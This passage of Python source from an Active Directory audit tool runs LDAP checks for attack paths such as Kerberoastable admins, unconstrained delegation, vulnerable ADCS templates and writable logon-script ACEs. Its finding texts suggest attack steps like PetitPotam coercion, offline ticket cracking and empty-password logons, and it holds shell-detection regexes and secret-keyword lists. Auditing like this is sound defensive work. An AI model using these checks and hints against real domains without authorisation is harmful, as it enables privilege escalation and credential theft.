                        sev = SEVERITY.get(right, "LOW")
                        if sev not in ("CRITICAL","HIGH","MEDIUM"):
                            continue
                        findings["adminsdholder_dangerous_aces"].append({
                            "trustee_sid":  trustee,
                            "trustee_name": trustee_name,
                            "right":        right,
                            "severity":     "CRITICAL",                                     
                            "inherited":    ace["inherited"],
                            "finding": (
                                f"[CRITICAL] '{trustee_name}' has {right} on AdminSDHolder. "
                                "SDProp will propagate this ACE to ALL adminCount=1 accounts every 60 min. "
                                "This is a persistent backdoor affecting ALL domain privileged accounts."
                            ),
                        })
    except Exception:
        pass

                                                                             
                                                
                                                                             
    print(f"  {Fore.CYAN}[*] Needle: Finding TRUSTED_FOR_DELEGATION user accounts...{Style.RESET_ALL}")
    deleg_entries = paged_search_all(
        conn, domain_dn,
        search_filter="(&(objectClass=user)(!(objectClass=computer))"
                      "(userAccountControl:1.2.840.113556.1.4.803:=524288))",
        attributes=["sAMAccountName","userAccountControl","memberOf","distinguishedName","adminCount"],
        page_size=page_size,
    )
    for e in deleg_entries:
        attrs    = e.get("attributes", {})
        sam      = str(first_value(attrs.get("sAMAccountName")) or "?")
        uac      = int(first_value(attrs.get("userAccountControl")) or 0)
        adm      = int(first_value(attrs.get("adminCount")) or 0)
        disabled = bool(uac & UAC_DISABLED)
        groups   = [str(g).split(",")[0].replace("CN=","") for g in listify(attrs.get("memberOf"))[:5]]
        findings["delegation_users"].append({
            "sam":       sam,
            "dn":        e.get("dn",""),
            "disabled":  disabled,
            "admin_count": adm,
            "member_of": groups,
            "severity":  "CRITICAL" if adm == 1 else "HIGH",
            "finding": (
                f"User account '{sam}' has Unconstrained Delegation "
                "(TRUSTED_FOR_DELEGATION). Any privileged machine authenticating to a service "
                f"running as '{sam}' will cache its TGT there. "
                + ("Account is PRIVILEGED (adminCount=1) — CRITICAL: TGT capture leads to DA."
                   if adm == 1 else
                   "Account is ACTIVE — coerce PrinterBug/PetitPotam to capture DC TGT."
                   if not disabled else
                   "Account is DISABLED — lower risk but investigate why flag is still set.")
            ),
        })

                                                                             
                                              
                                                                             
    print(f"  {Fore.CYAN}[*] Needle: Checking Kerberoastable Domain Admin accounts...{Style.RESET_ALL}")
    kerb_da = paged_search_all(
        conn, domain_dn,
        search_filter="(&(objectClass=user)(!(objectClass=computer))"
                      "(servicePrincipalName=*)(adminCount=1)"
                      "(!(userAccountControl:1.2.840.113556.1.4.803:=2)))",
        attributes=["sAMAccountName","servicePrincipalName","memberOf","pwdLastSet"],
        page_size=page_size,
    )
    for e in kerb_da:
        attrs = e.get("attributes", {})
        sam   = str(first_value(attrs.get("sAMAccountName")) or "?")
        spns  = [str(s) for s in listify(attrs.get("servicePrincipalName"))[:5]]
        groups = [str(g).split(",")[0].replace("CN=","") for g in listify(attrs.get("memberOf"))[:5]]
        findings["kerberoastable_da"].append({
            "sam":      sam,
            "dn":       e.get("dn",""),
            "spns":     spns,
            "member_of": groups,
            "severity": "CRITICAL",
            "finding": (
                f"[CRITICAL] '{sam}' is Kerberoastable (has SPN) AND has adminCount=1. "
                "Request a TGS for any of its SPNs, crack it offline — if successful, "
                "obtain credentials for a privileged account directly."
            ),
        })

                                                                             
                                                               
                                                                             
    print(f"  {Fore.CYAN}[*] Needle: Finding orphaned adminCount=1 accounts...{Style.RESET_ALL}")
    ac_entries = paged_search_all(
        conn, domain_dn,
        search_filter="(&(adminCount=1)(objectClass=user)(!(objectClass=computer))"
                      "(!(userAccountControl:1.2.840.113556.1.4.803:=2)))",
        attributes=["sAMAccountName","memberOf","distinguishedName","userAccountControl"],
        page_size=page_size,
    )
    for e in ac_entries:
        attrs = e.get("attributes", {})
        sam   = str(first_value(attrs.get("sAMAccountName")) or "?")
        uac_v = int(first_value(attrs.get("userAccountControl")) or 0)
                                                                                
        if sam.lower() in known_priv_members:
            continue
        if sam.lower() in ("krbtgt", "administrator"):
            continue
                                                              
        if uac_v & UAC_DISABLED:
            continue
        member_dns = listify(attrs.get("memberOf"))
        groups     = [str(g).split(",")[0].replace("CN=","") for g in member_dns[:5]]
                                                             
        is_still_priv = any(
            any(kw in g.lower() for kw in
                ("admin","operator","backup","server","print","schema","enterprise","policy creator"))
            for g in groups
        )
        if is_still_priv:
            continue
        findings["orphaned_admin_count"].append({
            "sam":       sam,
            "dn":        e.get("dn",""),
            "member_of": groups,
            "severity":  "HIGH",
            "finding": (
                f"'{sam}' has adminCount=1 but is NOT in any known privileged group. "
                "SDProp still grants this account AdminSDHolder-level ACL protection. "
                "Common indicator of a backdoor account or forgotten post-compromise artifact."
            ),
        })

                                                                             
                                                    
                                                                             
    print(f"  {Fore.CYAN}[*] Needle: Checking Pre-Windows 2000 Compatible Access...{Style.RESET_ALL}")
    conn.search(
        search_base=domain_dn,
        search_filter="(sAMAccountName=Pre-Windows 2000 Compatible Access)",
        search_scope=SUBTREE,
        attributes=["member","distinguishedName"],
    )
    if conn.entries:
        for mdn in (conn.entries[0]["member"].values or []):
            mdn_str  = str(mdn)
            cn       = mdn_str.split(",")[0].replace("CN=","").replace("cn=","")
            high_risk = cn.lower() in ("everyone","anonymous logon","authenticated users")
            findings["pre_win2000_members"].append({
                "member_dn": mdn_str,
                "member_cn": cn,
                "high_risk": high_risk,
                "severity":  "CRITICAL" if high_risk else "MEDIUM",
                "finding": (
                    f"'{cn}' is a member of 'Pre-Windows 2000 Compatible Access'. "
                    + ("CRITICAL: Grants read access to ALL domain objects to Everyone/Anonymous. "
                       "Enables unauthenticated enumeration (null session attack)."
                       if high_risk else
                       "Verify this membership is intentional and necessary.")
                ),
            })

                                                                             
                                         
                                                                             
    print(f"  {Fore.CYAN}[*] Needle: Finding PASSWD_NOTREQD enabled accounts...{Style.RESET_ALL}")
    pnr_entries = paged_search_all(
        conn, domain_dn,
        search_filter="(&(objectClass=user)(!(objectClass=computer))"
                      "(userAccountControl:1.2.840.113556.1.4.803:=32)"
                      "(!(userAccountControl:1.2.840.113556.1.4.803:=2)))",
        attributes=["sAMAccountName","userAccountControl","memberOf",
                    "distinguishedName","adminCount"],
        page_size=page_size,
    )
    for e in pnr_entries:
        attrs  = e.get("attributes", {})
        sam    = str(first_value(attrs.get("sAMAccountName")) or "?")
        adm    = int(first_value(attrs.get("adminCount")) or 0)
        groups = [str(g).split(",")[0].replace("CN=","") for g in listify(attrs.get("memberOf"))[:5]]
        findings["passwd_notreqd_enabled"].append({
            "sam":       sam,
            "dn":        e.get("dn",""),
            "member_of": groups,
            "admin_count": adm,
            "severity":  "CRITICAL" if adm == 1 else "HIGH",
            "finding": (
                f"'{sam}' has PASSWD_NOTREQD flag and is an active account. "
                "May have an empty password — attempt authentication with empty string "
                "or username as password."
                + (" PRIVILEGED account (adminCount=1) — critical." if adm == 1 else "")
            ),
        })

                                                                             
                                                                        
                                                                             
    print(f"  {Fore.CYAN}[*] Needle: Checking DONT_REQ_PREAUTH on privileged accounts...{Style.RESET_ALL}")
    asrep_priv = paged_search_all(
        conn, domain_dn,
        search_filter="(&(objectClass=user)(!(objectClass=computer))"
                      "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"
                      "(adminCount=1)"
                      "(!(userAccountControl:1.2.840.113556.1.4.803:=2)))",
        attributes=["sAMAccountName","memberOf","distinguishedName"],
        page_size=page_size,
    )
    for e in asrep_priv:
        attrs  = e.get("attributes", {})
        sam    = str(first_value(attrs.get("sAMAccountName")) or "?")
        groups = [str(g).split(",")[0].replace("CN=","") for g in listify(attrs.get("memberOf"))[:5]]
        findings["asrep_priv_accounts"].append({
            "sam":       sam,
            "dn":        e.get("dn",""),
            "member_of": groups,
            "severity":  "CRITICAL",
            "finding": (
                f"[CRITICAL] '{sam}' has DONT_REQ_PREAUTH (ASREPRoastable) AND adminCount=1. "
                "Request an AS-REP without pre-authentication, crack the encrypted part offline "
                "— this directly yields credentials for a privileged account."
            ),
        })

                                                                             
                             
                                                                             
    print(f"  {Fore.CYAN}[*] Needle: Checking ms-DS-MachineAccountQuota...{Style.RESET_ALL}")
    try:
        conn.search(
            search_base=domain_dn,
            search_filter="(objectClass=domain)",
            search_scope=BASE,
            attributes=["ms-DS-MachineAccountQuota"],
        )
        if conn.entries:
            quota_val = first_value(conn.entries[0]["ms-DS-MachineAccountQuota"].values)
            quota = int(quota_val or 0)
            findings["machine_account_quota"] = {
                "quota": quota,
                "severity": "HIGH" if quota > 0 else "INFO",
                "finding": (
                    f"[HIGH] ms-DS-MachineAccountQuota = {quota}. "
                    f"Any authenticated domain user can add up to {quota} machine accounts. "
                    "This is required for RBCD attacks without an existing machine account, "
                    "and for noPac (CVE-2021-42278/42287) exploitation."
                    if quota > 0 else
                    f"ms-DS-MachineAccountQuota = 0. Domain users cannot add machine accounts — correct."
                ),
            }
    except Exception:
        pass

                                                                             
                                  
                                                                             
    print(f"  {Fore.CYAN}[*] Needle: Checking DNS Admins membership...{Style.RESET_ALL}")
    try:
        conn.search(
            search_base=domain_dn,
            search_filter="(sAMAccountName=DnsAdmins)",
            search_scope=SUBTREE,
            attributes=["member"],
        )
        if conn.entries:
            for mdn in (conn.entries[0]["member"].values or []):
                mdn_str = str(mdn)
                cn = mdn_str.split(",")[0].replace("CN=","").replace("cn=","")
                try:
                    conn.search(
                        search_base=mdn_str, search_filter="(objectClass=*)", search_scope=BASE,
                        attributes=["sAMAccountName","userAccountControl","objectClass"],
                    )
                    if conn.entries:
                        me   = conn.entries[0]
                        msam = str(me["sAMAccountName"].value or cn)
                        muac = int(me["userAccountControl"].value or 0) if me["userAccountControl"].value else 0
                        cls  = [c.lower() for c in me["objectClass"].values]
                        findings["dns_admins_members"].append({
                            "sam":      msam,
                            "dn":       mdn_str,
                            "type":     "Group" if "group" in cls else "User",
                            "disabled": bool(muac & UAC_DISABLED),
                            "severity": "HIGH",
                            "finding": (
                                f"'{msam}' is a member of DnsAdmins. "
                                "DNS Admins can load an arbitrary DLL into the DNS service (running as SYSTEM) "
                                "on the DC via dnscmd — this is a well-known privilege escalation path "
                                "to SYSTEM on the Domain Controller."
                            ),
                        })
                except Exception:
                    pass
    except Exception:
        pass

                                                                             
                                                      
                                                                             
    print(f"  {Fore.CYAN}[*] Needle: Checking Schema Admins and Enterprise Admins...{Style.RESET_ALL}")
    for grp, key in (("Schema Admins", "schema_admins"),
                     ("Enterprise Admins", "enterprise_admins")):
        conn.search(
            search_base=domain_dn,
            search_filter=f"(sAMAccountName={grp})",
            search_scope=SUBTREE,
            attributes=["member"],
        )
        if not conn.entries:
            continue
        member_dns = [str(m) for m in (conn.entries[0]["member"].values or [])]
        for mdn in member_dns:
            cn = mdn.split(",")[0].replace("CN=","").replace("cn=","")
            if cn.lower() in ("krbtgt", grp.lower()):
                continue
            try:
                conn.search(
                    search_base=mdn, search_filter="(objectClass=*)", search_scope=BASE,
                    attributes=["sAMAccountName","userAccountControl","objectClass"],
                )
                if not conn.entries:
                    continue
                me      = conn.entries[0]
                msam    = str(me["sAMAccountName"].value or cn)
                muac    = int(me["userAccountControl"].value or 0) if me["userAccountControl"].value else 0
                classes = [c.lower() for c in me["objectClass"].values]
                is_user = "user" in classes
                disabled = bool(muac & UAC_DISABLED)
                findings["unexpected_schema_ea"][key].append({
                    "sam":      msam,
                    "dn":       mdn,
                    "type":     "User" if is_user else ("Group" if "group" in classes else "Other"),
                    "disabled": disabled,
                    "severity": "CRITICAL",
                    "finding": (
                        f"'{msam}' is a member of '{grp}'. "
                        + (f"{grp} should be empty outside specific operations. "
                           "Persistent membership is highly unusual — likely a backdoor."
                           if grp == "Schema Admins" else
                           "Enterprise Admins have full forest control. "
                           "Verify this membership is authorized.")
                    ),
                })
            except Exception:
                pass

                                                                             
                                                                        
                                                                             
    print(f"  {Fore.CYAN}[*] Needle: Scanning ADCS certificate templates (ESC1/ESC4/ESC6)...{Style.RESET_ALL}")
    pki_base = f"CN=Public Key Services,CN=Services,CN=Configuration,{domain_dn}"
                                                                     
    try:
        ca_entries = paged_search_all(
            conn, pki_base,
            search_filter="(objectClass=pKIEnrollmentService)",
            attributes=["cn","msPKI-Enrollment-Flag","distinguishedName",
                        "nTSecurityDescriptor","dNSHostName"],
            page_size=50,
            extra_controls=sd_ctrl,
        )
        for ca_e in ca_entries:
            ca_attrs = ca_e.get("attributes", {})
            ca_name  = str(first_value(ca_attrs.get("cn")) or "?")
            ca_flags = int(first_value(ca_attrs.get("msPKI-Enrollment-Flag")) or 0)
            if ca_flags & 0x40:                                  
                findings["adcs_esc6"].append({
                    "ca_name":  ca_name,
                    "dn":       ca_e.get("dn",""),
                    "severity": "CRITICAL",
                    "finding": (
                        f"[ESC6-CRITICAL] CA '{ca_name}' has EDITF_ATTRIBUTESUBJECTALTNAME2 set. "
                        "Any user who can enroll in ANY template can specify a SAN (Subject Alternative "
                        "Name) — request a certificate as any user including Domain Admin."
                    ),
                })
    except Exception:
        pass
                                               
    try:
        tmpl_entries = paged_search_all(
            conn, pki_base,
            search_filter="(objectClass=pKICertificateTemplate)",
            attributes=["cn","msPKI-Certificate-Name-Flag","msPKI-Enrollment-Flag",
                        "msPKI-RA-Signature","pKIExtendedKeyUsage",
                        "nTSecurityDescriptor","distinguishedName"],
            page_size=200,
            extra_controls=sd_ctrl,
        )
        LOW_PRIV_TRUSTEES = {
            "S-1-1-0",               
            "S-1-5-11",                         
            "S-1-5-7",                
        }
        for tmpl_e in tmpl_entries:
            tmpl_attrs = tmpl_e.get("attributes", {})
            tmpl_name  = str(first_value(tmpl_attrs.get("cn")) or "?")
            name_flag  = int(first_value(tmpl_attrs.get("msPKI-Certificate-Name-Flag")) or 0)
            enroll_flag = int(first_value(tmpl_attrs.get("msPKI-Enrollment-Flag")) or 0)
            ra_sig     = int(first_value(tmpl_attrs.get("msPKI-RA-Signature")) or 0)
            ekus       = listify(tmpl_attrs.get("pKIExtendedKeyUsage"))
            ekus_str   = [str(e_) for e_ in ekus]
                                             
            AUTH_EKUS = {
                "1.3.6.1.5.5.7.3.2",                         
                "1.3.6.1.4.1.311.20.2.2",                    
                "2.5.29.37.0",                      
                "1.3.6.1.5.2.3.4",                        
            }
            has_auth_eku = any(e_ in AUTH_EKUS for e_ in ekus_str) or not ekus_str
                                                                                    
            enrollee_supplies_san = bool(name_flag & 0x1)
                                                              
            manager_approval = bool(enroll_flag & 0x2)
                                                                                      
            if enrollee_supplies_san and has_auth_eku and not manager_approval and ra_sig == 0:
                                      
                raw_sd_list = tmpl_e.get("raw_attributes", {}).get("nTSecurityDescriptor", [])
                if raw_sd_list:
                    tmpl_sd = raw_sd_list[0]
                    for ace in parse_aces(tmpl_sd):
                        if ace["type"] not in (0x00, 0x05):
                            continue
                                                           
                        ENROLL_GUID = "0e10c968-78fb-11d2-90d4-00c04f79dc55"
                        AUTOENROLL_GUID = "a05b8cc2-17bc-4802-a710-e7c15ab866a2"
                        guid_l = (ace["guid"] or "").lower()
                        if not (ace["access_mask"] & 0x100 and
                                (not guid_l or guid_l in (ENROLL_GUID, AUTOENROLL_GUID))):
                            continue
                        if ace["trustee"] not in LOW_PRIV_TRUSTEES:
                            continue
                        trustee_name = resolve_sid_to_name(conn, domain_dn, ace["trustee"])
                        findings["adcs_esc1"].append({
                            "template_name": tmpl_name,
                            "dn":            tmpl_e.get("dn",""),
                            "enrollee_sid":  ace["trustee"],
                            "enrollee_name": trustee_name,
                            "ekus":          ekus_str,
                            "severity":      "CRITICAL",
                            "finding": (
                                f"[ESC1-CRITICAL] Template '{tmpl_name}' allows '{trustee_name}' "
                                "to enroll AND supply the SubjectAltName. "
                                "With a valid auth EKU, any user can request a certificate "
                                "for any user (e.g. Administrator) and authenticate as them."
                            ),
                        })
                                                                  
            raw_sd_list = tmpl_e.get("raw_attributes", {}).get("nTSecurityDescriptor", [])
            if raw_sd_list:
                tmpl_sd = raw_sd_list[0]
                for ace in parse_aces(tmpl_sd):
                    if ace["type"] not in (0x00, 0x05):
                        continue
                    trustee = ace["trustee"]
                    is_legit = (
                        trustee in priv_sids
                        or (domain_sid and trustee.startswith(domain_sid + "-") and
                            trustee.split("-")[-1] in ("512","516","519","518","500"))
                        or trustee in ("S-1-5-18","S-1-5-32-544","S-1-5-9")
                    )
                    if is_legit:
                        continue
                    write_rights = (ace["access_mask"] & 0x00040000 or             
                                    ace["access_mask"] & 0x00080000 or              
                                    (ace["access_mask"] & 0x000F01FF) == 0x000F01FF or              
                                    ace["access_mask"] & 0x00000020)                  
                    if not write_rights:
                        continue
                    trustee_name = resolve_sid_to_name(conn, domain_dn, trustee)
                    right_desc = decode_rights_verbose(ace["access_mask"], ace["guid"])
                    findings["adcs_esc4"].append({
                        "template_name": tmpl_name,
                        "dn":            tmpl_e.get("dn",""),
                        "trustee_sid":   trustee,
                        "trustee_name":  trustee_name,
                        "rights":        right_desc,
                        "severity":      "HIGH",
                        "finding": (
                            f"[ESC4-HIGH] '{trustee_name}' has write access ({right_desc}) "
                            f"on certificate template '{tmpl_name}'. "
                            "Can modify the template to enable ESC1 conditions, then request "
                            "a certificate as any user."
                        ),
                    })
    except Exception:
        pass

                                                                             
                                                                          
                                                                             
    print(f"  {Fore.CYAN}[*] Needle: Scanning userParameters for embedded scripts...{Style.RESET_ALL}")
    up_entries = paged_search_all(
        conn, domain_dn,
        search_filter="(&(objectClass=user)(!(objectClass=computer))(userParameters=*))",
        attributes=["sAMAccountName","userParameters","userAccountControl",
                    "adminCount","whenChanged"],
        page_size=page_size,
    )
    for e in up_entries:
        attrs    = e.get("attributes", {})
        sam      = str(first_value(attrs.get("sAMAccountName")) or "?")
        up_raw   = e.get("raw_attributes", {}).get("userParameters", [])
        uac      = int(first_value(attrs.get("userAccountControl")) or 0)
        adm      = int(first_value(attrs.get("adminCount")) or 0)
        changed  = str(first_value(attrs.get("whenChanged")) or "")
        if not up_raw:
            continue
                                                              
        up_str = ""
        try:
            up_str = up_raw[0].decode("utf-16-le", errors="replace")
        except Exception:
            try:
                up_str = up_raw[0].decode("utf-8", errors="replace")
            except Exception:
                continue
                                               
        suspicious_indicators = []
        for pat in [re.compile(r'\\\\[A-Za-z0-9._-]+\\', re.IGNORECASE),            
                    re.compile(r'[Cc]tX[A-Za-z]{2}'),                           
                    re.compile(r'[Ss]cript', re.IGNORECASE),
                    re.compile(r'cmd\.exe|powershell|wscript|cscript', re.IGNORECASE)]:
            m = pat.search(up_str)
            if m:
                suspicious_indicators.append(m.group()[:40])
        if not suspicious_indicators:
            continue
        findings["userparams_suspicious"].append({
            "sam":          sam,
            "dn":           e.get("dn",""),
            "admin_count":  adm,
            "disabled":     bool(uac & UAC_DISABLED),
            "when_changed": changed,
            "indicators":   suspicious_indicators,
            "severity":     "HIGH" if adm == 1 else "MEDIUM",
            "finding": (
                f"'{sam}' has suspicious content in userParameters: "
                f"{', '.join(suspicious_indicators[:3])}. "
                "userParameters can embed Terminal Services logon scripts — "
                "inspect and verify legitimacy."
            ),
        })

                                                                             
                                                              
                                                                             
    print(f"  {Fore.CYAN}[*] Needle: Scanning info/description fields for credentials...{Style.RESET_ALL}")
    info_entries = paged_search_all(
        conn, domain_dn,
        search_filter="(objectClass=*)",
        attributes=["sAMAccountName","objectClass","userAccountControl",
                    "adminCount","distinguishedName"] + _SENSITIVE_LDAP_FIELDS,
        page_size=page_size,
    )
    for e in info_entries:
        attrs    = e.get("attributes", {})
        sam      = str(first_value(attrs.get("sAMAccountName")) or "")
        dn_str   = e.get("dn", "")
        if not sam:
            sam = dn_str.split(",")[0].replace("CN=","").replace("OU=","")
        classes  = listify(attrs.get("objectClass"))
        uac_raw  = first_value(attrs.get("userAccountControl"))
        uac      = int(uac_raw or 0)
        adm      = int(first_value(attrs.get("adminCount")) or 0)
        is_user  = "user" in [c.lower() for c in classes]
        is_comp  = "computer" in [c.lower() for c in classes]
        is_group = "group" in [c.lower() for c in classes]
        obj_type = "Computer" if is_comp else ("Group" if is_group else "User" if is_user else "Object")

        for field in _SENSITIVE_LDAP_FIELDS:
            val = str(first_value(attrs.get(field)) or "").strip()
            if not val or len(val) < 12:
                continue

            low_val = val.lower()
            secret_markers = (
                "password", "passwd", "pwd", "secret", "token",
                "credential", "api key", "api-key", "client secret",
                "bearer", "basic ", "connection string", "connstring",
                "auth token", "refresh token"
            )
            if not any(marker in low_val for marker in secret_markers):
                continue

            matched_patterns = []
            for pat in _PWD_RE:
                m = pat.search(val)
                if m and len(m.group().strip()) >= 10:
                    matched_patterns.append(m.group()[:60])

            if not matched_patterns:
                continue

            if _is_fp_info_field(val, matched_patterns[0]):
                continue

            sev = "CRITICAL" if (adm == 1 or is_group) else "HIGH"
            findings["info_field_passwords"].append({
                "sam":      sam,
                "dn":       dn_str,
                "type":     obj_type,
                "field":    field,
                "value":    val[:120],
                "matches":  matched_patterns[:3],
                "admin_count": adm,
                "disabled": bool(uac & UAC_DISABLED) if is_user or is_comp else False,
                "severity": sev,
                "finding": (
                    f"[{sev}] '{sam}' ({obj_type}) has potential credential in "
                    f"LDAP field '{field}': '{val[:80]}'. "
                    "Credentials stored in LDAP info/description fields are readable "
                    "by ANY authenticated domain user via LDAP query."
                ),
            })

                                                                             
                                                                        
                                                                            
                                                                             
    print(f"  {Fore.CYAN}[*] Needle: ACE-based WriteScriptPath scanner (user DACLs)...{Style.RESET_ALL}")
    SCRIPTPATH_GUID   = "bf9679a8-0de6-11d0-a285-00aa003049e2"              
    LOGINSCRIPT_GUID  = "ea1b7b93-5e48-46d5-bc6c-4df4fda78a35"                        
    SCRIPT_GUIDS      = {SCRIPTPATH_GUID: "WriteScriptPath", LOGINSCRIPT_GUID: "WriteLoginScript"}
    user_sd_entries = paged_search_all(
        conn, domain_dn,
        search_filter="(&(objectClass=user)(!(objectClass=computer)))",
        attributes=["sAMAccountName","nTSecurityDescriptor","adminCount","userAccountControl"],
        page_size=page_size,
        extra_controls=sd_ctrl,
    )
    seen_scriptpath_combo: set = set()
    for e in user_sd_entries:
        attrs     = e.get("attributes", {})
        sam_tgt   = str(first_value(attrs.get("sAMAccountName")) or "?")
        adm       = int(first_value(attrs.get("adminCount")) or 0)
        uac_v     = int(first_value(attrs.get("userAccountControl")) or 0)
        raw_sd_l  = e.get("raw_attributes", {}).get("nTSecurityDescriptor", [])
        if not raw_sd_l:
            continue
        aces = parse_aces(raw_sd_l[0])
        for ace in aces:
            if ace["type"] not in (0x00, 0x05):
                continue
                                                       
                                                                                           
            if ace["inherited"]:
                continue
            if not (ace["access_mask"] & 0x00000020):                      
                continue
            guid_low = (ace["guid"] or "").lower()
            right_name = SCRIPT_GUIDS.get(guid_low)
                                                                       
            if not right_name:
                if ((ace["access_mask"] & 0x000F01FF) == 0x000F01FF or
                    ace["access_mask"] & 0x10000000 or
                    ace["access_mask"] & 0x40000000 or
                    (ace["access_mask"] & 0x00000020 and not ace["guid"])):
                    right_name = "GenericWrite/WriteAllProperties→WriteScriptPath"
                else:
                    continue
            trustee = ace["trustee"]
            is_legit_trustee = (
                trustee in priv_sids
                or (domain_sid and trustee.startswith(domain_sid + "-") and
                    trustee.split("-")[-1] in ("512","516","519","518","500","9"))
                or trustee in ("S-1-5-18","S-1-5-32-544","S-1-5-9","S-1-5-10")
            )
            if is_legit_trustee:
                continue
            combo = (trustee, sam_tgt, right_name)
            if combo in seen_scriptpath_combo:
                continue
            seen_scriptpath_combo.add(combo)
            trustee_name = resolve_sid_to_name(conn, domain_dn, trustee)
            sev = "CRITICAL" if adm == 1 else "HIGH"
            findings["write_scriptpath_aces"].append({
                "trustee_sid":   trustee,
                "trustee_name":  trustee_name,
                "target_sam":    sam_tgt,
                "target_dn":     e.get("dn",""),
                "right":         right_name,
                "target_is_priv": adm == 1,
                "target_disabled": bool(uac_v & UAC_DISABLED),
                "inherited":     ace["inherited"],
                "severity":      sev,
                "finding": (
                    f"[{sev}] '{trustee_name}' has {right_name} on user '{sam_tgt}'. "
                    "An attacker controlling this principal can set scriptPath to a UNC "
                    "path they control — code executes in the target's security context "
                    "on next interactive logon."
                    + (" Target is a PRIVILEGED account (adminCount=1)." if adm == 1 else "")
                ),
            })

                                                                             
                                                                             
                                                                             
    print(f"  {Fore.CYAN}[*] Needle: Scanning privileged group DACLs...{Style.RESET_ALL}")
    PRIV_GROUPS_TO_SCAN = [
        "Domain Admins", "Enterprise Admins", "Schema Admins",
        "Administrators", "Group Policy Creator Owners",
        "Account Operators", "Backup Operators", "Server Operators",
    ]
    for grp_name in PRIV_GROUPS_TO_SCAN:
        try:
            conn.search(
                search_base=domain_dn,
                search_filter=f"(sAMAccountName={grp_name})",
                search_scope=SUBTREE,
                attributes=["nTSecurityDescriptor","distinguishedName"],
                controls=sd_ctrl,
            )
            if not conn.entries:
                continue
            raw_grp_sd = conn.entries[0]["nTSecurityDescriptor"].raw_values
            if not raw_grp_sd:
                continue
            grp_dn = str(conn.entries[0]["distinguishedName"].value or "")
            grp_sd = raw_grp_sd[0]
            grp_owner_sid  = parse_sd_owner(grp_sd)
            grp_owner_name = resolve_sid_to_name(conn, domain_dn, grp_owner_sid) if grp_owner_sid else "?"
            is_susp_owner = (
                grp_owner_sid not in priv_sids
                and not (domain_sid and grp_owner_sid.endswith("-512"))
                and grp_owner_sid not in ("S-1-5-18","S-1-5-32-544","","S-1-5-9")
            )
            if is_susp_owner:
                findings["privileged_group_acls"].append({
                    "group":         grp_name,
                    "group_dn":      grp_dn,
                    "trustee_sid":   grp_owner_sid,
                    "trustee_name":  grp_owner_name,
                    "right":         "OWNER",
                    "severity":      "CRITICAL",
                    "finding": (
                        f"[CRITICAL] Privileged group '{grp_name}' is owned by "
                        f"'{grp_owner_name}'. The owner can modify the DACL and "
                        "grant themselves AddMember — direct path to privilege escalation."
                    ),
                })
            for ace in parse_aces(grp_sd):
                if ace["type"] not in (0x00, 0x05):
                    continue
                trustee = ace["trustee"]
                is_legit = (
                    trustee in priv_sids
                    or (domain_sid and trustee.startswith(domain_sid + "-") and
                        trustee.split("-")[-1] in ("512","516","519","518","520","521","500"))
                    or trustee in ("S-1-5-18","S-1-5-32-544","S-1-5-9","S-1-5-10","S-1-5-11")
                )
                if is_legit:
                    continue
                rights = check_rights(ace["access_mask"], ace["guid"], include_all=False)
                if not rights:
                    continue
                trustee_name = resolve_sid_to_name(conn, domain_dn, trustee)
                for right in rights:
                    sev = SEVERITY.get(right, "LOW")
                    if sev not in ("CRITICAL","HIGH","MEDIUM"):
                        continue
                    sev = "CRITICAL"                                                 
                    findings["privileged_group_acls"].append({
                        "group":        grp_name,
                        "group_dn":     grp_dn,
                        "trustee_sid":  trustee,
                        "trustee_name": trustee_name,
                        "right":        right,
                        "inherited":    ace["inherited"],
                        "severity":     sev,
                        "finding": (
                            f"[CRITICAL] '{trustee_name}' has {right} on privileged group "
                            f"'{grp_name}'. This allows direct privilege escalation by adding "
                            "controlled principals to the group."
                        ),
                    })
        except Exception:
            pass

                                                                             
                                           
                                                                             
    print(f"  {Fore.CYAN}[*] Needle: Checking krbtgt password age...{Style.RESET_ALL}")
    try:
        conn.search(
            search_base=domain_dn,
            search_filter="(sAMAccountName=krbtgt)",
            search_scope=SUBTREE,
            attributes=["pwdLastSet","whenChanged"],
        )
        if conn.entries:
            e = conn.entries[0]
            pls_raw = first_value(e["pwdLastSet"].values) if e["pwdLastSet"].values else None
            pls_int = int(pls_raw) if pls_raw else 0
            pls_dt  = filetime_to_dt(pls_int)
            age_days = days_since(pls_dt) if pls_dt else None
            if age_days is not None:
                if age_days > 365:
                    sev = "CRITICAL"
                    msg = (f"[CRITICAL] krbtgt password is {age_days} days old (>{365} days). "
                           "A stale krbtgt key enables Golden Ticket attacks — any previously "
                           "dumped krbtgt hash remains valid for creating forged TGTs. "
                           "Rotate krbtgt password TWICE immediately.")
                elif age_days > 180:
                    sev = "HIGH"
                    msg = (f"[HIGH] krbtgt password is {age_days} days old (>{180} days). "
                           "Microsoft recommends rotating every 180 days to limit Golden Ticket "
                           "attack windows. Rotate krbtgt password twice.")
                else:
                    sev = "INFO"
                    msg = f"krbtgt password age: {age_days} days — within acceptable range."
                findings["krbtgt_password_age"] = {
                    "days":      age_days,
                    "last_set":  str(pls_dt) if pls_dt else "unknown",
                    "severity":  sev,
                    "finding":   msg,
                }
    except Exception:
        pass

                                                                             
                                                                             
                                                                             
    print(f"  {Fore.CYAN}[*] Needle: Checking cleartext password storage (UAC 0x80)...{Style.RESET_ALL}")
    ct_entries = paged_search_all(
        conn, domain_dn,
        search_filter="(&(objectClass=user)"
                      "(userAccountControl:1.2.840.113556.1.4.803:=128)"
                      "(!(userAccountControl:1.2.840.113556.1.4.803:=2)))",
        attributes=["sAMAccountName","userAccountControl","adminCount","memberOf"],
        page_size=page_size,
    )
    for e in ct_entries:
        attrs = e.get("attributes", {})
        sam   = str(first_value(attrs.get("sAMAccountName")) or "?")
        adm   = int(first_value(attrs.get("adminCount")) or 0)
        groups = [str(g).split(",")[0].replace("CN=","") for g in listify(attrs.get("memberOf"))[:5]]
        findings["cleartext_password_storage"].append({
            "sam":       sam,
            "dn":        e.get("dn",""),
            "member_of": groups,
            "admin_count": adm,
            "severity":  "CRITICAL" if adm == 1 else "HIGH",
            "finding": (
                f"[{'CRITICAL' if adm == 1 else 'HIGH'}] '{sam}' has "
                "ENCRYPTED_TEXT_PWD_ALLOWED (UAC 0x80) — the domain controller stores "
                "this account's password with reversible encryption. The plaintext password "
                "can be recovered from the AD database (ntds.dit) or from memory."
                + (" PRIVILEGED account — immediate credential exposure risk." if adm == 1 else "")
            ),
        })

                                                                             
                                                            
                                                                             
    print(f"  {Fore.CYAN}[*] Needle: Checking DA members not in Protected Users...{Style.RESET_ALL}")
    try:
        conn.search(
            search_base=domain_dn,
            search_filter="(sAMAccountName=Protected Users)",
            search_scope=SUBTREE,
            attributes=["member"],
        )
        protected_users_dns = set()
        if conn.entries:
